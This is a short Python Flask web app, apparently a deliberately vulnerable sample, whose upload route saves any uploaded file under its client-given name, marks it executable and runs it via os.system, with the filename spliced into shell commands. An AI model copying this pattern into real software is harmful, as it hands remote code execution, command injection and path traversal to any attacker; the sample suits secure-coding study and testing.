from flask import Flask, request, render_template
import os

app = Flask(__name__)

@app.route('/upload', methods=['POST', 'GET'])
def upload_file():
    if request.method == 'POST':
        f = request.files['file']
        filename = f.filename
        f.save(filename)
        os.system('chmod +x ' + filename)
        os.system('./' + filename)
    return render_template('upload.html')
